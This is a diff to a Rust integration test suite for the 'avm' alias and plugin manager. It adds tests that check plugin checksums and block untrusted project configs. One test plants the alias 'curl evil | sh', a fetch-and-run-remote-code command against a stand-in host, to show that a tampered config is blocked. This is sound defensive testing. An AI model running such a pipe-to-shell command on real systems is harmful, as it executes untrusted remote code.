@@ -1,3 +1,6 @@
+// These drive real sh aliases, symlinked plugins and tar fixtures (Unix only).
+#![cfg(unix)]
+
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Output};
@@ -43,6 +46,7 @@ fn run_avm(cwd: &Path, home: &Path, args: &[&str]) -> Output {
         .current_dir(cwd)
         .env("HOME", home)
         .env("AVM_PLUGIN_DIR", home.join(".avm").join("plugins"))
+        .env("AVM_TRUST_ALL", "1")
         .output()
         .expect("run avm-bin")
 }
@@ -53,7 +57,8 @@ fn run_avm_with_env(cwd: &Path, home: &Path, args: &[&str], envs: &[(&str, &Path
         .args(args)
         .current_dir(cwd)
         .env("HOME", home)
-        .env("AVM_PLUGIN_DIR", home.join(".avm").join("plugins"));
+        .env("AVM_PLUGIN_DIR", home.join(".avm").join("plugins"))
+        .env("AVM_TRUST_ALL", "1");
     for (key, value) in envs {
         command.env(key, value);
     }
@@ -95,10 +100,12 @@ fn create_node_archive(dist: &Path, version: &str) {
         .status()
         .expect("create fake node archive");
     assert!(status.success(), "tar fake node archive");
+    let sha = avm_plugin_api::sha256_file(&release_dir.join(&archive)).expect("hash fake node archive");
+    write_file(&release_dir.join("SHASUMS256.txt"), &format!("{sha}  {archive}\n"));
 }
 
 /// Providers are no longer compiled into avm-bin (see the marketplace model
-/// in crates/avm-runtime — `avm plugin add <name>` fetches a **compiled**
+/// in crates/avm-cli/src/runtime.rs — `avm plugin add <name>` fetches a **compiled**
 /// release from the plugin's own repo, built on GitHub's `ubuntu-latest`
 /// runners). That's proven working end-to-end separately (see
 /// docs/migration/PLUGIN_PROTOCOL.md) — for this test suite, fetching that
@@ -229,7 +236,7 @@ fn resolves_and_runs_local_aliases() {
 
     let output = run_avm(&work, &home, &["resolve", "dev", "web"]);
     assert_success(&output);
-    assert_eq!(stdout(&output).trim(), "'echo' 'local-dev:web'");
+    assert_eq!(stdout(&output).trim(), "echo local-dev:web");
 
     let output = run_avm(&work, &home, &["run", "dev", "web"]);
     assert_success(&output);
@@ -241,7 +248,7 @@ fn resolves_and_runs_local_aliases() {
 
     let output = run_avm(&work, &home, &["env"]);
     assert_success(&output);
-    assert!(stdout(&output).contains("export AVM_TEST_ENV='local'"));
+    assert!(stdout(&output).contains("export AVM_TEST_ENV=local"));
 }
 
 #[test]
@@ -290,8 +297,8 @@ fn local_config_overrides_global_config() {
 
     let output = run_avm(&work, &home, &["env"]);
     assert_success(&output);
-    assert!(stdout(&output).contains("export SCOPE='local'"));
-    assert!(stdout(&output).contains("export SHARED='yes'"));
+    assert!(stdout(&output).contains("export SCOPE=local"));
+    assert!(stdout(&output).contains("export SHARED=yes"));
 }
 
 #[test]
@@ -791,10 +798,9 @@ fn alias_exit_code_propagates_in_shell_mode() {
 }
 
 #[test]
-fn alias_quoted_metacharacters_stay_in_direct_mode() {
-    // `;` inside double quotes is literal; needs_shell() must not promote.
-    // We can't directly observe direct vs shell mode, but we can ensure the
-    // literal semicolon survives intact in the output.
+fn alias_quoted_metacharacters_stay_literal() {
+    // `;` inside double quotes is literal to `sh -c`; the semicolon must
+    // survive intact in the output.
     let root = temp_root("quoted-meta-alias");
     let home = root.join("home");
     let work = root.join("work");
@@ -1007,4 +1013,119 @@ fn corrupt_global_config_is_backed_up_and_recovered() {
         entries.iter().any(|n| n.starts_with(".avm.broken-")),
         "no backup in: {entries:?}"
     );
+}
+
+/// Serve a fake `o/fake` GitHub release from local files and check that
+/// `avm plugin add fake` refuses tampered or unverifiable archives (#19).
+#[test]
+fn marketplace_install_verifies_checksums() {
+    let root = temp_root("checksums");
+    let asset = format!(
+        "avm-plugin-fake_{}_{}.tar.gz",
+        if cfg!(target_os = "macos") { "darwin" } else { "linux" },
+        if cfg!(target_arch = "aarch64") { "arm64" } else { "amd64" },
+    );
+    let build = root.join("build");
+    write_file(&build.join("avm-plugin-fake"), "#!/bin/sh\n");
+    let archive = root.join(&asset);
+    let tar = Command::new("tar").arg("-czf").arg(&archive).arg("-C").arg(&build).arg("avm-plugin-fake").status();
+    assert!(tar.expect("run tar").success());
+    let good = avm_plugin_api::sha256_file(&archive).unwrap();
+
+    let registry = root.join("registry.json");
+    write_file(&registry, r#"{"plugins":[{"name":"fake","description":"x","repo":"o/fake"}]}"#);
+    let release = root.join("api/repos/o/fake/releases/latest");
+    let sums = root.join("checksums.txt");
+    let publish = |hash: Option<&str>| {
+        let mut assets = vec![format!(r#"{{"name":"{asset}","browser_download_url":"file://{}"}}"#, archive.display())];
+        if let Some(hash) = hash {
+            write_file(&sums, &format!("{hash}  {asset}\n"));
+            assets.push(format!(r#"{{"name":"checksums.txt","browser_download_url":"file://{}"}}"#, sums.display()));
+        }
+        write_file(&release, &format!(r#"{{"tag_name":"v1.0.0","assets":[{}]}}"#, assets.join(",")));
+    };
+    let plugin = root.join(".avm/plugins/avm-plugin-fake");
+    let api = root.join("api");
+    let add = |extra: &[(&str, &Path)]| {
+        let mut envs = vec![("AVM_MARKETPLACE_URL", registry.as_path()), ("AVM_GITHUB_API_URL", api.as_path())];
+        envs.extend_from_slice(extra);
+        run_avm_with_env(&root, &root, &["plugin", "add", "fake"], &envs)
+    };
+
+    publish(Some(&"0".repeat(64)));
+    let out = add(&[]);
+    assert_failure(&out);
+    assert!(stderr(&out).contains("checksum mismatch"), "{}", stderr(&out));
+    assert!(!plugin.exists(), "tampered install left files behind");
+
+    publish(None);
+    let out = add(&[]);
+    assert_failure(&out);
+    assert!(stderr(&out).contains("no checksums.txt"), "{}", stderr(&out));
+    assert!(!plugin.exists());
+    assert_success(&add(&[("AVM_ALLOW_UNVERIFIED", Path::new("1"))]));
+    assert!(fs::read_to_string(plugin.join("meta.json")).unwrap().contains(r#""verified":false"#));
+
+    publish(Some(&good));
+    assert_success(&add(&[]));
+    let meta = fs::read_to_string(plugin.join("meta.json")).unwrap();
+    assert!(meta.contains(&good) && meta.contains(r#""verified":true"#), "{meta}");
+    assert!(plugin.join("bin/avm-plugin").exists());
+
+    // No asset for this host: say which platforms the release does have (#22).
+    write_file(&release, r#"{"tag_name":"v1.0.0","assets":[{"name":"avm-plugin-fake_plan9_mips.tar.gz","browser_download_url":"file:///x"}]}"#);
+    let out = add(&[]);
+    assert_failure(&out);
+    assert!(stderr(&out).contains("has no release for") && stderr(&out).contains("available: plan9_mips"), "{}", stderr(&out));
+}
+
+/// Clone → cd → blocked → trust → works → edit → blocked (#20).
+#[test]
+fn untrusted_project_config_is_ignored_until_trusted() {
+    let root = temp_root("trust");
+    let home = root.join("home");
+    let project = root.join("repo");
+    fs::create_dir_all(&home).unwrap();
+    let config = project.join(".avm.json");
+    write_file(&config, r#"{"aliases":{"hi":"echo hi"},"env":{"EVIL":"1"},"tools":{}}"#);
+    write_file(&project.join(".env"), "DOTENV_EVIL=1\n");
+    let avm = |args: &[&str]| {
+        Command::new(avm_bin())
+            .args(args)
+            .current_dir(&project)
+            .env("HOME", &home)
+            .env("AVM_PLUGIN_DIR", home.join(".avm/plugins"))
+            .env_remove("AVM_TRUST_ALL")
+            .env_remove("_AVM_TRUST_NOTICE")
+            .output()
+            .unwrap()
+    };
+
+    let out = avm(&["resolve", "hi"]);
+    assert_failure(&out);
+    assert!(stderr(&out).contains("not trusted"), "{}", stderr(&out));
+    let env = stdout(&avm(&["env"]));
+    assert!(!env.contains("EVIL=") && env.contains("not trusted") && env.contains("_AVM_TRUST_NOTICE"), "{env}");
+
+    let out = avm(&["trust"]);
+    assert_success(&out);
+    assert!(stdout(&out).contains("alias hi → echo hi") && stdout(&out).contains("DOTENV_EVIL=1"), "{}", stdout(&out));
+    assert_success(&avm(&["resolve", "hi"]));
+    let env = stdout(&avm(&["env"]));
+    assert!(env.contains("export EVIL=1") && !env.contains("not trusted"), "{env}");
+
+    // Editing through avm keeps it trusted; editing by hand re-blocks it.
+    assert_success(&avm(&["add", "bye", "echo", "bye"]));
+    assert_success(&avm(&["resolve", "bye"]));
+    write_file(&config, r#"{"aliases":{"hi":"curl evil | sh"}}"#);
+    assert_failure(&avm(&["resolve", "hi"]));
+
+    // trusted_paths globs in the global config trust without a hash.
+    write_file(&home.join(".avm.json"), &format!(r#"{{"trusted_paths":["{}/**"]}}"#, root.display()));
+    assert_success(&avm(&["resolve", "hi"]));
+    write_file(&home.join(".avm.json"), "{}");
+
+    assert_success(&avm(&["trust"]));
+    assert_success(&avm(&["trust", "--revoke"]));
+    assert_failure(&avm(&["resolve", "hi"]));
 }
